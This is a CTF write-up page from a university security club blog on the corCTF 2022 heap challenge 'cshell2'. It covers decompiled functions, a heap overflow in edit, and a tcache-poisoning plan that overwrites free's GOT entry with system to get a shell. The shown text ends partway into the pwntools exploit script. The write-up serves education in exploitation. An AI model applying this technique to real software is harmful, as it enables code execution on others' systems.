<!DOCTYPE html>
<html><head>
<title>[corCTF 2022 - pwn] cshell2</title>




<meta charset="utf-8">
<meta name="X-UA-Compatible" content="IE=edge">
<meta name="google-site-verification" content="">
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
<meta content="telephone=no" name="format-detection">
<meta name="description" content="">
<meta name="renderer" content="webkit">
<meta name="theme-color" content="#ffffff">



<meta property="og:title" content="[corCTF 2022 - pwn] cshell2" />
<meta property="og:description" content="Introduction cshell2 is a heap challenge I did during the corCTF 2022 event. It was pretty classic so I will not describe a lot. If you begin with heap challenges, I advice you to read previous heap writeup.
TL; DR  Fill tcache. Heap overflow in edit on the bio field which allows to leak the address of the unsortedbin. Leak heap and defeat safe-linking to get an arbitrary write through tcache poisoning." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://clubsecuesiea.github.io/posts/cshell2/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-08-07T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-08-07T00:00:00+00:00" /><meta property="og:site_name" content="ESIEA security club" />






<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="[corCTF 2022 - pwn] cshell2"/>
<meta name="twitter:description" content="Introduction cshell2 is a heap challenge I did during the corCTF 2022 event. It was pretty classic so I will not describe a lot. If you begin with heap challenges, I advice you to read previous heap writeup.
TL; DR  Fill tcache. Heap overflow in edit on the bio field which allows to leak the address of the unsortedbin. Leak heap and defeat safe-linking to get an arbitrary write through tcache poisoning."/>







<link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">


  






<link rel="stylesheet" href="/scss/journal.min.c5d92f380bf10f6849c7ac487c7df2b22c081e0851e5339224f1ae29210b20d2.css" integrity="sha256-xdkvOAvxD2hJx6xIfH3ysiwIHghR5TOSJPGuKSELINI=" media="screen">



<link rel="stylesheet" href="/scss/dark-mode.min.9f8d8c2df9285089d141edd4a50cb7506c7948e6ab79a29968dced1bd0ab7d22.css" integrity="sha256-n42MLfkoUInRQe3UpQy3UGx5SOareaKZaNztG9CrfSI=" media="screen">


<script src="/vendor/js/loadCSS.js"></script>
<script>
  loadCSS("https://fonts.googleapis.com/css?family=Fira+Mono|Material+Icons");
</script>




<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"></script>
<script>
    document.addEventListener("DOMContentLoaded", function() {
        renderMathInElement(document.body, {
          
          
          delimiters: [
              {left: '$$', right: '$$', display: true},
              {left: '$', right: '$', display: false},
              {left: '\\(', right: '\\)', display: false},
              {left: '\\[', right: '\\]', display: true}
          ],
          
          throwOnError : false
        });
    });
</script>



  <script src="/js/toc.js"></script>



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script src="/vendor/js/md5.min.js"></script>
<script>
  var gitalk = new Gitalk({
  clientID: '',
  clientSecret: '',
  repo: '',
  owner: '',
  admin: [''],
  id: md5(location.pathname),
  distractionFreeMode: 'false'
  });
  window.onload = function () {
        gitalk.render('gitalk-container')
  }
</script>












</head>
<body>
    	<div id="app"><div id="sideContainer" class="side-container">
    
    <a class="a-block nav-head false" href="https://clubsecuesiea.github.io/">
    
        <div class="nav-title">
            ESIEA security club
        </div>
        
    </a>

    <div class="nav-link-list">
        
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/posts/about/">
                About us
            </a>
            
        
            
            
            
                
            
            
            
            <a class="a-block nav-link-item active" href="/posts">
                Archive
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/categories">
                Categories
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/tags">
                Tags
            </a>
            
        
    </div>

    

    <div class="nav-footer">
        
Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://risehere.net/">Rise</a>
<br>
Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
<br>

&copy;
	
	Beerware shit
	

    </div>
    
</div><div id="extraContainer" class="extra-container">
    
    
    <div class="toc animated-visibility" :class="{ invisible: scrollY <= 140 }">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#introduction" onclick="onNavClick(`#introduction-nav`)" id="introduction-nav">
									Introduction
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#tl-dr" onclick="onNavClick(`#tl-dr-nav`)" id="tl-dr-nav">
									TL; DR
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#reverse-engineering" onclick="onNavClick(`#reverse-engineering-nav`)" id="reverse-engineering-nav">
									Reverse Engineering
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#exploitation" onclick="onNavClick(`#exploitation-nav`)" id="exploitation-nav">
									Exploitation
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#libc--heap-leak" onclick="onNavClick(`#libc--heap-leak-nav`)" id="libc--heap-leak-nav">
									Libc / heap leak
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#tcache-poisoning--profit" onclick="onNavClick(`#tcache-poisoning--profit-nav`)" id="tcache-poisoning--profit-nav">
									Tcache poisoning &#43; PROFIT
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#appendices" onclick="onNavClick(`#appendices-nav`)" id="appendices-nav">
									Appendices
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
    
    <div class="pagination">
        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top" :class="{ invisible: scrollY == 0 }">
            <i class="material-icons pagination-action-icon">
                keyboard_arrow_up
            </i>
        </a>
        
        <a type="button" class="pagination-action" id="darkModeToggleButton">
            <span class="material-icons pagination-action-icon" id="darkModeToggleIcon">
                dark_mode
            </span>
        </a>
        
        
    </div>
</div>
<div class="single-column-drawer-container" id="drawer"
     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
    <div class="drawer-content">
        <div class="drawer-menu">
            
            
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/posts/about/">
                    About us
                </a>
                
            
                
                
                
                    
                
                
                
                <a class="a-block drawer-menu-item active" href="/posts">
                    Archive
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/categories">
                    Categories
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/tags">
                    Tags
                </a>
                
            
            
            <div class="toc">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#introduction" onclick="onNavClick(`#introduction-nav`)" id="introduction-nav">
									Introduction
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#tl-dr" onclick="onNavClick(`#tl-dr-nav`)" id="tl-dr-nav">
									TL; DR
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#reverse-engineering" onclick="onNavClick(`#reverse-engineering-nav`)" id="reverse-engineering-nav">
									Reverse Engineering
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#exploitation" onclick="onNavClick(`#exploitation-nav`)" id="exploitation-nav">
									Exploitation
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#libc--heap-leak" onclick="onNavClick(`#libc--heap-leak-nav`)" id="libc--heap-leak-nav">
									Libc / heap leak
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#tcache-poisoning--profit" onclick="onNavClick(`#tcache-poisoning--profit-nav`)" id="tcache-poisoning--profit-nav">
									Tcache poisoning &#43; PROFIT
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#appendices" onclick="onNavClick(`#appendices-nav`)" id="appendices-nav">
									Appendices
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
            
        </div>
    </div>
</div>
<transition name="fade">
    <div id="drawer-mask" v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
</transition>
<nav id="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
    <div id="navBackground" class="nav-background"></div>
    <div class="container container-narrow nav-content">
        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
            <i class="material-icons">
                menu
            </i>
        </button>
        <a id="navTitle" class="navbar-brand" href="https://clubsecuesiea.github.io/">
            ESIEA security club
        </a>
        
        <button type="button" class="nav-darkmode-toggle" id="darkModeToggleButton2">
            <i class="material-icons" id="darkModeToggleIcon2">
                dark_mode
            </i>
        </button>
        
    </div>
</nav>
<div class="single-column-header-container" id="pageHead"
     v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
    <a href="https://clubsecuesiea.github.io/">
        <div class="single-column-header-title">ESIEA security club</div>
        

    </a>
</div>

            <div id="content">
                <div id="streamContainer" class="stream-container">

    <div class="post-list-container post-list-container-shadow">
        <div class="post">
            
            
            

            <div class="post-head-wrapper-text-only"
                
            >
                <div class="post-title">
                    [corCTF 2022 - pwn] cshell2
                    
                    <div class="post-meta">
                        
                        <time itemprop="datePublished">
                            2022-08-07 00:00
                        </time>
                        

                        
                            <i class="material-icons" style="">folder</i>
                                <a href="/categories/pwn">pwn</a>
                                &nbsp;
                        

                        
                            <i class="material-icons" style="">label</i>
                            
                                <a href="/tags/ctf">ctf</a>
                                &nbsp;
                            
                                <a href="/tags/corctf">corCTF</a>
                                &nbsp;
                            
                                <a href="/tags/2022">2022</a>
                                &nbsp;
                            
                                <a href="/tags/heap">heap</a>
                                &nbsp;
                            
                                <a href="/tags/nasm">nasm</a>
                                &nbsp;
                            
                                <a href="/tags/pwn">pwn</a>
                                &nbsp;
                            
                        
                        
                    </div>
                </div>
            </div>
            
            <div class="post-body-wrapper">
                
                <div class="post-body" v-pre>
                
                    <h2 id="introduction">Introduction</h2>
<p><code>cshell2</code> is a heap challenge I did during the <a href="https://ctftime.org/event/1656">corCTF 2022</a> event. It was pretty classic so I will not describe a lot.
If you begin with heap challenges, I advice you to read <a href="https://ret2school.github.io/tags/heap/">previous heap writeup</a>.</p>
<h2 id="tl-dr">TL; DR</h2>
<ul>
<li>Fill tcache.</li>
<li>Heap overflow in <code>edit</code> on the <code>bio</code> field which allows to leak the address of the unsortedbin.</li>
<li>Leak heap and defeat safe-linking to get an arbitrary write through tcache poisoning.</li>
<li>Hiijack GOT entry of <code>free</code> to <code>system</code>.</li>
<li>Call <code>free(&quot;/bin/sh&quot;)</code>.</li>
<li>PROFIT</li>
</ul>
<h2 id="reverse-engineering">Reverse Engineering</h2>
<p>Let&rsquo;s take a look at the provided binary and libc:</p>
<pre tabindex="0"><code>$ ./libc.so.6 
GNU C Library (GNU libc) development release version 2.36.9000.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 12.1.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
Minimum supported kernel: 3.2.0
For bug reporting instructions, please see:
&lt;https://www.gnu.org/software/libc/bugs.html&gt;.
$ checksec --file cshell2
[*] '/home/nasm/Documents/pwn/corCTF/cshell2/cshell2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fb000)
    RUNPATH:  b'.'
</code></pre><p>A very recent libc plus a non PIE-based binary without <code>FULL RELRO</code>. Thus we could think to some GOT hiijacking stuff directly on the binary. Let&rsquo;s take a look at the <code>add</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">add</span>()
{
  <span style="color:#66d9ef">int</span> idx_1; <span style="color:#75715e">// ebx
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span> idx; <span style="color:#75715e">// [rsp+Fh] [rbp-21h] BYREF
</span><span style="color:#75715e"></span>  size_t size; <span style="color:#75715e">// [rsp+10h] [rbp-20h] BYREF
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// [rsp+18h] [rbp-18h]
</span><span style="color:#75715e"></span>
  v4 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
  puts(<span style="color:#e6db74">&#34;Enter index: &#34;</span>);
  __isoc99_scanf(<span style="color:#e6db74">&#34;%hhu&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
  puts(<span style="color:#e6db74">&#34;Enter size (1032 minimum): &#34;</span>);
  __isoc99_scanf(<span style="color:#e6db74">&#34;%lu&#34;</span>, <span style="color:#f92672">&amp;</span>size);
  <span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0xEu</span> <span style="color:#f92672">||</span> size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x407</span> <span style="color:#f92672">||</span> size_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx] )
  {
    puts(<span style="color:#e6db74">&#34;Error with either index or size...&#34;</span>);
  }
  <span style="color:#66d9ef">else</span>
  {
    idx_1 <span style="color:#f92672">=</span> idx;
    chunk_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx_1] <span style="color:#f92672">=</span> (chunk_t <span style="color:#f92672">*</span>)malloc(size);
    size_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx] <span style="color:#f92672">=</span> size;
    puts(<span style="color:#e6db74">&#34;Successfuly added!&#34;</span>);
    puts(<span style="color:#e6db74">&#34;Input firstname: &#34;</span>);
    read(<span style="color:#ae81ff">0</span>, chunk_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx], <span style="color:#ae81ff">8uLL</span>);
    puts(<span style="color:#e6db74">&#34;Input middlename: &#34;</span>);
    read(<span style="color:#ae81ff">0</span>, chunk_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx]<span style="color:#f92672">-&gt;</span>midName, <span style="color:#ae81ff">8uLL</span>);
    puts(<span style="color:#e6db74">&#34;Input lastname: &#34;</span>);
    read(<span style="color:#ae81ff">0</span>, chunk_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx]<span style="color:#f92672">-&gt;</span>lastName, <span style="color:#ae81ff">8uLL</span>);
    puts(<span style="color:#e6db74">&#34;Input age: &#34;</span>);
    __isoc99_scanf(<span style="color:#e6db74">&#34;%lu&#34;</span>, <span style="color:#f92672">&amp;</span>chunk_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx]<span style="color:#f92672">-&gt;</span>age);
    puts(<span style="color:#e6db74">&#34;Input bio: &#34;</span>);
    read(<span style="color:#ae81ff">0</span>, chunk_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx]<span style="color:#f92672">-&gt;</span>bio, <span style="color:#ae81ff">0x100uLL</span>);
  }
  <span style="color:#66d9ef">return</span> v4 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
}
</code></pre></div><p>It creates a chunk by asking several fields but nothing actually interesting there. Let&rsquo;s take a look at the <code>show</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">show</span>()
{
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span> v1; <span style="color:#75715e">// [rsp+7h] [rbp-9h] BYREF
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v2; <span style="color:#75715e">// [rsp+8h] [rbp-8h]
</span><span style="color:#75715e"></span>
  v2 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
  puts(<span style="color:#e6db74">&#34;Enter index: &#34;</span>);
  __isoc99_scanf(<span style="color:#e6db74">&#34;%hhu&#34;</span>, <span style="color:#f92672">&amp;</span>v1);
  <span style="color:#66d9ef">if</span> ( v1 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xEu</span> <span style="color:#f92672">&amp;&amp;</span> size_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v1] )
    printf(
      <span style="color:#e6db74">&#34;Name</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> last: %s first: %s middle: %s age: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">bio: %s&#34;</span>,
      chunk_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v1]<span style="color:#f92672">-&gt;</span>lastName,
      chunk_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v1]<span style="color:#f92672">-&gt;</span>firstName,
      chunk_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v1]<span style="color:#f92672">-&gt;</span>midName,
      chunk_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v1]<span style="color:#f92672">-&gt;</span>age,
      chunk_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v1]<span style="color:#f92672">-&gt;</span>bio);
  <span style="color:#66d9ef">else</span>
    puts(<span style="color:#e6db74">&#34;Invalid index&#34;</span>);
  <span style="color:#66d9ef">return</span> v2 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
}
</code></pre></div><p>It prints a chunk only if it&rsquo;s allocated (size entry initialized in the size array) and if the index is right.
Then the <code>delete</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">delete</span>()
{
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span> v1; <span style="color:#75715e">// [rsp+7h] [rbp-9h] BYREF
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v2; <span style="color:#75715e">// [rsp+8h] [rbp-8h]
</span><span style="color:#75715e"></span>
  v2 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
  printf(<span style="color:#e6db74">&#34;Enter index: &#34;</span>);
  __isoc99_scanf(<span style="color:#e6db74">&#34;%hhu&#34;</span>, <span style="color:#f92672">&amp;</span>v1);
  <span style="color:#66d9ef">if</span> ( v1 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xEu</span> <span style="color:#f92672">&amp;&amp;</span> size_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v1] )
  {
    free(chunk_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v1]);
    size_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v1] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
    puts(<span style="color:#e6db74">&#34;Successfully Deleted!&#34;</span>);
  }
  <span style="color:#66d9ef">else</span>
  {
    puts(<span style="color:#e6db74">&#34;Either index error or trying to delete something you shouldn&#39;t be...&#34;</span>);
  }
  <span style="color:#66d9ef">return</span> v2 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
}
</code></pre></div><p>Quite common <code>delete</code> handler, it prevents double free.
The vulnerability is in the <code>edit</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#a6e22e">edit</span>()
{
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int8</span> idx; <span style="color:#75715e">// [rsp+7h] [rbp-9h] BYREF
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v2; <span style="color:#75715e">// [rsp+8h] [rbp-8h]
</span><span style="color:#75715e"></span>
  v2 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
  printf(<span style="color:#e6db74">&#34;Enter index: &#34;</span>);
  __isoc99_scanf(<span style="color:#e6db74">&#34;%hhu&#34;</span>, <span style="color:#f92672">&amp;</span>idx);
  <span style="color:#66d9ef">if</span> ( idx <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xEu</span> <span style="color:#f92672">&amp;&amp;</span> size_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx] )
  {
    puts(<span style="color:#e6db74">&#34;Input firstname: &#34;</span>);
    read(<span style="color:#ae81ff">0</span>, chunk_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx], <span style="color:#ae81ff">8uLL</span>);
    puts(<span style="color:#e6db74">&#34;Input middlename: &#34;</span>);
    read(<span style="color:#ae81ff">0</span>, chunk_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx]<span style="color:#f92672">-&gt;</span>midName, <span style="color:#ae81ff">8uLL</span>);
    puts(<span style="color:#e6db74">&#34;Input lastname: &#34;</span>);
    read(<span style="color:#ae81ff">0</span>, chunk_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx]<span style="color:#f92672">-&gt;</span>lastName, <span style="color:#ae81ff">8uLL</span>);
    puts(<span style="color:#e6db74">&#34;Input age: &#34;</span>);
    __isoc99_scanf(<span style="color:#e6db74">&#34;%lu&#34;</span>, <span style="color:#f92672">&amp;</span>chunk_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx]<span style="color:#f92672">-&gt;</span>age);
    printf(<span style="color:#e6db74">&#34;Input bio: (max %d)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, size_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx] <span style="color:#f92672">-</span> <span style="color:#ae81ff">32LL</span>);
    read(<span style="color:#ae81ff">0</span>, chunk_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx]<span style="color:#f92672">-&gt;</span>bio, size_array[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> idx] <span style="color:#f92672">-</span> <span style="color:#ae81ff">32LL</span>);
    puts(<span style="color:#e6db74">&#34;Successfully edit&#39;d!&#34;</span>);
  }
  <span style="color:#66d9ef">return</span> v2 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
}
</code></pre></div><p>It reads <code>size_array[2 * idx] - 32LL</code> bytes into a <code>0x100</code>-sized buffer which leads to a heap overflow.</p>
<h2 id="exploitation">Exploitation</h2>
<p>There is no actual issue, we can allocate whatever chunk bigger than <code>0x407</code>, the only fancy thing we have to do would be to defeat safe-linking to get an arbitrary write with a tcache poisoning attack on the <code>0x410</code> tcache bin. Here is the attack I led against the challenge but that&rsquo;s not the most optimized.</p>
<p>The plan is to:</p>
<ul>
<li>Allocate two <code>0x408</code>-sized chunks : pivot and victim, in order to easily get later libc leak.</li>
<li>Allocate 9 more chunks and then fill the <code>0x410</code> tcachebin with them (with only 7 of them).</li>
<li>Delete <code>victim</code> and overflow pivot up to the next free pointer of <code>victim</code> to get a libc leak.</li>
<li>Allocate a <code>0x408</code>-sized chunk to get the <code>8</code>-th chunk (within <code>chunk_array</code>) which is on the top of the bin.</li>
<li>Leak the heap same way as for libc, but we have to defeat safe-linking.</li>
<li>Delete the <code>9</code>-th chunk to put it in the tcachebin at the first position.</li>
<li>Then we can simply <code>edit</code> chunk <code>8</code> and overflow over chunk <code>9</code> to poison its next <code>fp</code> to hiijack it toward the GOT entry of <code>free</code>.</li>
<li>Pop chunk <code>9</code> from the freelist and then request another the target memory area : the GOT entry of <code>free</code>.</li>
<li>Write <code>system</code> into the GOT entry of <code>free</code>.</li>
<li>Free whatever chunk for which <code>//bin/sh</code> is written at the right begin.</li>
<li>PROFIT.</li>
</ul>
<p>To understand the attack process I&rsquo;ll show the heap state at certain part of the attack.</p>
<h2 id="libc--heap-leak">Libc / heap leak</h2>
<p>First we have to fill the tcache. We allocate a chunk right after <code>chunk0</code> we do not put into the tcache to be able to put it in the unsortedbin to make appear unsortedbin&rsquo;s address:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">add(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1032</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;//bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">1337</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#75715e"># pivot</span>
add(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1032</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">1337</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#75715e"># victim</span>

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">7</span><span style="color:#f92672">+</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>):
    add(i, <span style="color:#ae81ff">1032</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">1337</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">7</span><span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>):
    delete(i)

delete(<span style="color:#ae81ff">1</span>)
edit(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">1337</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Y&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>))

show(<span style="color:#ae81ff">0</span>)
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Y&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
